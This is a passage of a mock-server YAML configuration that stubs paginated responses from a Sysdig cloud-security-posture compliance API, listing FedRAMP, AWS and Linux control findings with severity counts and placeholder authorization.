                              "resourceApiEndpoint": "/api/cspm/v1/cloud/resources?controlId=21447&providerType=AWS&resourceKind=AWS_CLOUDFORMATION_STACK&filter=policyId=52 and zones.id=119",
                              "supportedDistributions": [
                                  {
                                      "name": "AWS",
                                      "minVersion": 0,
                                      "maxVersion": 0
                                  }
                              ],
                              "platform": "",
                              "authors": "Sysdig",
                              "passingCount": 0
                          }
                      ],
                      "failedControls": 136,
                      "highSeverityCount": 3147,
                      "mediumSeverityCount": 20805,
                      "lowSeverityCount": 2926,
                      "acceptedCount": 0,
                      "description": "All Amazon Web Services Controls.",
                      "requirementId": "637489",
                      "zone": {
                          "id": "119",
                          "name": "Entire Infrastructure"
                      },
                      "passingCount": 23735
                  },
                  {
                      "name": "Linux Controls",
                      "pass": false,
                      "severity": "High",
                      "policyId": "52",
                      "policyName": "All Posture Findings",
                      "controls": [
                          {
                              "id": "34001",
                              "name": "Gpgcheck enabled",
                              "description": "It is important to ensure that an RPM's package signature is always checked prior to installation to ensure that the software is obtained from a trusted source.",
                              "target": "Linux",
                              "type": 7,
                              "pass": false,
                              "severity": "High",
                              "objectsCount": 5,
                              "remediationId": "34001",
                              "lastUpdate": "1752149383",
                              "acceptedCount": 0,
                              "resourceKind": "host",
                              "isManual": false,
                              "resourceApiEndpoint": "/api/cspm/v1/clusteranalysis/resources?controlId=34001&benchmarkType=0&resourceKind=host&filter=policyId=52 and zones.id=119",
                              "supportedDistributions": [],
                              "platform": "",
                              "authors": "Sysdig",
                              "passingCount": 0
                          }
                      ],
                      "failedControls": 528,
                      "highSeverityCount": 1749,
                      "mediumSeverityCount": 460,
                      "lowSeverityCount": 20,
                      "acceptedCount": 0,
                      "description": "All Linux Controls.",
                      "requirementId": "637486",
                      "zone": {
                          "id": "119",
                          "name": "Entire Infrastructure"
                      },
                      "passingCount": 803
                  }
              ],
              "totalCount": "5"
          }
          `}}
  - path: /api/cspm/v1/compliance/requirements
    methods: ['GET']
    query_params:
      pageNumber: 2
      pageSize: 2
    request_headers:
      Authorization:
        - "Bearer xxxx"
    responses:
      - status_code: 200
        headers:
          Content-Type:
            - 'application/json'
        body: |-
          {{ minify_json `
          {
              "data": [
                  {
                      "name": "CM-7 LEAST FUNCTIONALITY",
                      "pass": false,
                      "severity": "High",
                      "policyId": "27",
                      "policyName": "FedRAMP (Federal Risk and Authorization Management Program) High Baseline",
                      "controls": [
                          {
                              "id": "16071",
                              "name": "Networking - Disallowed Public Access to Administration Ports (ACL)",
                              "description": "Public access to remote server administration ports, such as 22 and 3389, increases resource attack surface and unnecessarily raises the risk of resource compromise.",
                              "target": "AWS",
                              "type": 8,
                              "pass": false,
                              "severity": "High",
                              "objectsCount": 19,
                              "remediationId": "16071",
                              "lastUpdate": "1752149383",
                              "acceptedCount": 0,
                              "resourceKind": "AWS_NETWORK_ACL",
                              "isManual": false,
                              "resourceApiEndpoint": "/api/cspm/v1/cloud/resources?controlId=16071&providerType=AWS&resourceKind=AWS_NETWORK_ACL&filter=policyId=27 and zones.id=119",
                              "supportedDistributions": [
                                  {
                                      "name": "aws",
                                      "minVersion": 0,
                                      "maxVersion": 0
                                  }
                              ],
                              "platform": "",
                              "authors": "Sysdig",
                              "passingCount": 0
                          }
                      ],
                      "failedControls": 197,
                      "highSeverityCount": 654,
                      "mediumSeverityCount": 158,
                      "lowSeverityCount": 41,
                      "acceptedCount": 2782,
                      "description": "The organization:\n a. Configures the information system to provide only essential capabilities; and\n b. Prohibits or restricts the use of the following functions, ports, protocols, and/or services: [Assignment: organization-defined prohibited or restricted functions, ports, protocols, and/or services].\n\nSupplemental Guidance: Information systems can provide a wide variety of functions and services. Some of the functions and services, provided by default, may not be necessary to support essential organizational operations (e.g., key missions, functions). Additionally, it is sometimes convenient to provide multiple services from single information system components, but doing so increases risk over limiting the services provided by any one component. Where feasible, organizations limit component functionality to a single function per device (e.g., email servers or web servers, but not both). Organizations review functions and services provided by information systems or individual components of information systems, to determine which functions and services are candidates for elimination (e.g., Voice Over Internet Protocol, Instant Messaging, auto-execute, and file sharing). Organizations consider disabling unused or unnecessary physical and logical ports/protocols (e.g., Universal Serial Bus, File Transfer Protocol, and Hyper Text Transfer Protocol) on information systems to prevent unauthorized connection of devices, unauthorized transfer of information, or unauthorized tunneling. Organizations can utilize network scanning tools, intrusion detection and prevention systems, and end-point protections such as firewalls and host-based intrusion detection systems to identify and prevent the use of prohibited functions, ports, protocols, and services. Related controls: AC-6, CM-2, RA-5, SA-5, SC-7.\n\nReferences: DoD Instruction 8551.01.\n\n\n*FedRAMP-Defined Assignment / Selection Parameters*:\n\nCM-7 (b) [United States Government Configuration Baseline (USGCB)]\n\n*Additional FedRAMP Requirements and Guidance*:\n\nCM-7 (b) Requirement: The service provider shall use the Center for Internet Security guidelines (Level 1) to establish list of prohibited or restricted functions, ports, protocols, and/or services or establishes its own list of prohibited or restricted functions, ports, protocols, and/or services if USGCB is not available.\nCM-7 Guidance: Information on the USGCB checklists can be found at: http://usgcb.nist.gov/usgcb_faq.html#usgcbfaq_usgcbfdcc.\n(Partially derived from AC-17(8).)",
                      "requirementId": "511163",
                      "zone": {
                          "id": "119",
                          "name": "Entire Infrastructure"
                      },
                      "passingCount": 2163
                  },
                  {
                      "name": "CM-6 CONFIGURATION SETTINGS",
                      "pass": false,
                      "severity": "High",
                      "policyId": "27",
                      "policyName": "FedRAMP (Federal Risk and Authorization Management Program) High Baseline",
                      "controls": [
                          {
                              "id": "16071",
                              "name": "Networking - Disallowed Public Access to Administration Ports (ACL)",
                              "description": "Public access to remote server administration ports, such as 22 and 3389, increases resource attack surface and unnecessarily raises the risk of resource compromise.",
                              "target": "AWS",
                              "type": 8,
                              "pass": false,
                              "severity": "High",
                              "objectsCount": 19,
                              "remediationId": "16071",
                              "lastUpdate": "1752149383",
                              "acceptedCount": 0,
                              "resourceKind": "AWS_NETWORK_ACL",
                              "isManual": false,
                              "resourceApiEndpoint": "/api/cspm/v1/cloud/resources?controlId=16071&providerType=AWS&resourceKind=AWS_NETWORK_ACL&filter=policyId=27 and zones.id=119",
                              "supportedDistributions": [
                                  {
                                      "name": "aws",
                                      "minVersion": 0,
                                      "maxVersion": 0
                                  }
                              ],
                              "platform": "",
                              "authors": "Sysdig",
                              "passingCount": 0
                          },
                          {
                              "id": "21",
                              "name": "Container with RunAsUser root or not set",
                              "description": "Running containers as root can result in pod escape",
                              "target": "Kubernetes",
                              "type": 1,
                              "pass": false,
                              "severity": "High",
                              "objectsCount": 15,
                              "remediationId": "13",
                              "lastUpdate": "1752149383",
                              "acceptedCount": 58,
                              "resourceKind": "workload",
                              "isManual": false,
                              "resourceApiEndpoint": "/api/cspm/v1/kube/resources?controlId=21&resourceKind=workload&filter=policyId=27 and zones.id=119",
                              "supportedDistributions": [
                                  {
                                      "name": "Vanilla",
                                      "minVersion": 0,
                                      "maxVersion": 0
                                  }
                              ],
                              "platform": "",
                              "authors": "Sysdig",
                              "passingCount": 4
                          }
                      ],
                      "failedControls": 188,
                      "highSeverityCount": 636,
                      "mediumSeverityCount": 157,
                      "lowSeverityCount": 40,
                      "acceptedCount": 1911,
                      "description": "The organization:\n a. Establishes and documents configuration settings for information technology products employed within the information system using [Assignment: organization-defined security configuration checklists] that reflect the most restrictive mode consistent with operational requirements;\n b. Implements the configuration settings;\n c. Identifies, documents, and approves any deviations from established configuration settings for [Assignment: organization-defined information system components] based on [Assignment: organization-defined operational requirements]; and\n d. Monitors and controls changes to the configuration settings in accordance with organizational policies and procedures.\n\nSupplemental Guidance: Configuration settings are the set of parameters that can be changed in hardware, software, or firmware components of the information system that affect the security posture and/or functionality of the system. Information technology products for which security- related configuration settings can be defined include, for example, mainframe computers, servers (e.g., database, electronic mail, authentication, web, proxy, file, domain name), workstations, input/output devices (e.g., scanners, copiers, and printers), network components (e.g., firewalls, routers, gateways, voice and data switches, wireless access points, network appliances, sensors), operating systems, middleware, and applications. Security-related parameters are those parameters impacting the security state of information systems including the parameters required to satisfy other security control requirements. Security-related parameters include, for example: (i) registry settings; (ii) account, file, directory permission settings; and (iii) settings for functions, ports, protocols, services, and remote connections. Organizations establish organization-wide configuration settings and subsequently derive specific settings for information systems. The established settings become part of the systems configuration baseline.\n\nCommon secure configurations (also referred to as security configuration checklists, lockdown\nand hardening guides, security reference guides, security technical implementation guides) provide recognized, standardized, and established benchmarks that stipulate secure configuration settings for specific information technology platforms/products and instructions for configuring those information system components to meet operational requirements. Common secure configurations can be developed by a variety of organizations including, for example, information technology product developers, manufacturers, vendors, consortia, academia, industry, federal agencies, and other organizations in the public and private sectors. Common secure configurations include the United States Government Configuration Baseline (USGCB) which affects the implementation of CM-6 and other controls such as AC-19 and CM-7. The Security Content Automation Protocol (SCAP) and the defined standards within the protocol (e.g., Common Configuration Enumeration) provide an effective method to uniquely identify, track, and control configuration settings. OMB establishes federal policy on configuration requirements for federal information systems. Related controls: AC-19, CM-2, CM-3, CM-7, SI-4.\n\nReferences: OMB Memoranda 07-11, 07-18, 08-22; NIST Special Publications 800-70, 800-128; Web: http://nvd.nist.gov, http://checklists.nist.gov, http://www.nsa.gov.\n\n\n*FedRAMP-Defined Assignment / Selection Parameters*:\n\nCM-6 (a) [United States Government Configuration Baseline (USGCB)]\n\n*Additional FedRAMP Requirements and Guidance*:\n\nCM-6 (a) Requirement 1: The service provider shall use the Center for Internet Security guidelines (Level 1) to establish configuration settings or establishes its own configuration settings if USGCB is not available.\nCM-6 (a) Requirement 2: The service provider shall ensure that checklists for configuration settings are Security Content Automation Protocol (SCAP) validated or SCAP compatible (if validated checklists are not available).\nCM-6 (a) Guidance: Information on the USGCB checklists can be found at: http://usgcb.nist.gov/usgcb_faq.html#usgcbfaq_usgcbfdcc",
                      "requirementId": "511160",
                      "zone": {
                          "id": "119",
                          "name": "Entire Infrastructure"
                      },
                      "passingCount": 1788
                  }
              ],
              "totalCount": "5"
          }
          `}}
  - path: /api/cspm/v1/compliance/requirements
    methods: ['GET']
    query_params:
      pageNumber: 3
      pageSize: 2
    request_headers:
      Authorization:
        - "Bearer xxxx"
    responses:
      - status_code: 200
        headers:
          Content-Type:
            - 'application/json'
        body: |-
          {{ minify_json `
          {
              "data": [
                  {
                      "name": "CM-7 LEAST FUNCTIONALITY",
                      "pass": false,
                      "severity": "High",
                      "policyId": "27",
                      "policyName": "FedRAMP (Federal Risk and Authorization Management Program) High Baseline",
                      "controls": [
                          {
                              "id": "16071",
                              "name": "Networking - Disallowed Public Access to Administration Ports (ACL)",
                              "description": "Public access to remote server administration ports, such as 22 and 3389, increases resource attack surface and unnecessarily raises the risk of resource compromise.",
                              "target": "AWS",
                              "type": 8,
                              "pass": false,
                              "severity": "High",
                              "objectsCount": 19,
                              "remediationId": "16071",
                              "lastUpdate": "1752231595",
                              "acceptedCount": 0,
                              "resourceKind": "AWS_NETWORK_ACL",
                              "isManual": false,
                              "resourceApiEndpoint": "/api/cspm/v1/cloud/resources?controlId=16071&providerType=AWS&resourceKind=AWS_NETWORK_ACL&filter=policyId=27 and zones.id=119",
                              "supportedDistributions": [
                                  {
                                      "name": "aws",
                                      "minVersion": 0,
                                      "maxVersion": 0
                                  }
                              ],
                              "platform": "",
                              "authors": "Sysdig",
                              "passingCount": 0
                          }
                      ],
                      "failedControls": 192,
                      "highSeverityCount": 639,
                      "mediumSeverityCount": 155,
                      "lowSeverityCount": 42,
                      "acceptedCount": 2793,
                      "description": "The organization:\n a. Configures the information system to provide only essential capabilities; and\n b. Prohibits or restricts the use of the following functions, ports, protocols, and/or services: [Assignment: organization-defined prohibited or restricted functions, ports, protocols, and/or services].\n\nSupplemental Guidance: Information systems can provide a wide variety of functions and services. Some of the functions and services, provided by default, may not be necessary to support essential organizational operations (e.g., key missions, functions). Additionally, it is sometimes convenient to provide multiple services from single information system components, but doing so increases risk over limiting the services provided by any one component. Where feasible, organizations limit component functionality to a single function per device (e.g., email servers or web servers, but not both). Organizations review functions and services provided by information systems or individual components of information systems, to determine which functions and services are candidates for elimination (e.g., Voice Over Internet Protocol, Instant Messaging, auto-execute, and file sharing). Organizations consider disabling unused or unnecessary physical and logical ports/protocols (e.g., Universal Serial Bus, File Transfer Protocol, and Hyper Text Transfer Protocol) on information systems to prevent unauthorized connection of devices, unauthorized transfer of information, or unauthorized tunneling. Organizations can utilize network scanning tools, intrusion detection and prevention systems, and end-point protections such as firewalls and host-based intrusion detection systems to identify and prevent the use of prohibited functions, ports, protocols, and services. Related controls: AC-6, CM-2, RA-5, SA-5, SC-7.\n\nReferences: DoD Instruction 8551.01.\n\n\n*FedRAMP-Defined Assignment / Selection Parameters*:\n\nCM-7 (b) [United States Government Configuration Baseline (USGCB)]\n\n*Additional FedRAMP Requirements and Guidance*:\n\nCM-7 (b) Requirement: The service provider shall use the Center for Internet Security guidelines (Level 1) to establish list of prohibited or restricted functions, ports, protocols, and/or services or establishes its own list of prohibited or restricted functions, ports, protocols, and/or services if USGCB is not available.\nCM-7 Guidance: Information on the USGCB checklists can be found at: http://usgcb.nist.gov/usgcb_faq.html#usgcbfaq_usgcbfdcc.\n(Partially derived from AC-17(8).)",
                      "requirementId": "511163",
                      "zone": {
                          "id": "119",
                          "name": "Entire Infrastructure"
                      },
                      "passingCount": 2183
                  }
              ],
              "totalCount": "5"
          }
          `}}
  - path: /api/cspm/v1/compliance/requirements
    methods: ['GET']
    query_params:
      pageNumber: 4
      pageSize: 2
    request_headers:
      Authorization:
        - "Bearer xxxx"
    responses:
      - status_code: 200
        headers:
          Content-Type:
            - 'application/json'
        body: |-
          {{ minify_json `
          {
              "data": [],
              "totalCount": "5"
          }
          `}}
